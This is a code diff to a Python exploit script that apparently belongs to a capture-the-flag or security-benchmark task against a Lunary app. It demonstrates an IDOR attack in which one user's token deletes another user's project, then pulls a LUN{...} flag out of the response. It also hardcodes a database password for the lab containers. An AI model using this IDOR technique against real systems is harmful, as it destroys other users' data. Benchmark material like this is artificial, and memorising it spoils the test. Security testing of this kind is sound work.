@@ -3,20 +3,13 @@ from pathlib import Path
 from dotenv import load_dotenv
 import os
 import psycopg2
+import re
 
-RUN_DB_FROM_HOST = True # toggle this to run DB from host or within docker context
-
-LUNARY_DIR = Path(__file__).resolve().parents[2]
-load_dotenv(LUNARY_DIR / ".env")
-
-# Setup database URL from .env
-if RUN_DB_FROM_HOST:
-    DATABASE_URL = os.getenv("HOST_DATABASE_URL")
-else:
-    DATABASE_URL = os.getenv("DATABASE_URL")
+# Setup postgres route
+DATABASE_URL="postgres://postgres:E19pMTpS6ignd@lunary-postgres:5432/lunary"
 
 # Setup backend route
-BACKEND_URL = os.getenv("NEXT_PUBLIC_API_URL")
+BACKEND_URL = "http://lunary-app:3333"
 
 def check_db_state():
     if not DATABASE_URL:
@@ -57,8 +50,6 @@ def delete_project(token, project_id):
     url = f"{BACKEND_URL}/v1/projects/{project_id}"
     headers = {"Authorization": f"Bearer {token}"}
     response = requests.delete(url, headers=headers, timeout=5)
-    import pdb
-    pdb.set_trace()
     if response.status_code != 200:
         print(f"Error deleting project: {response.status_code}")
         print(f"Response content: {response.text}")
@@ -78,14 +69,20 @@ def exploit():
 
     project_to_delete = user_b_projects[0]  # type: ignore
     print(f"Project ID targeting deletion: {project_to_delete}")
-    delete_status = delete_project(user_b_auth["token"], project_to_delete)
+    delete_status, delete_text = delete_project(user_b_auth["token"], project_to_delete)
     print(f"Delete project status: {delete_status}")
+    print(f"Delete project response: {delete_text}")
     print()
 
     print("After IDOR exploit")
     print(check_db_state())
-
     
+    # Define the regex pattern
+    pattern = r"LUN\{[^}]+\}"
+
+    # Search for the pattern in the string
+    flag = re.search(pattern, delete_text)
+    print(f"{flag.group(0)}")
 
 if __name__ == "__main__":
     print(f"Running on {BACKEND_URL}")
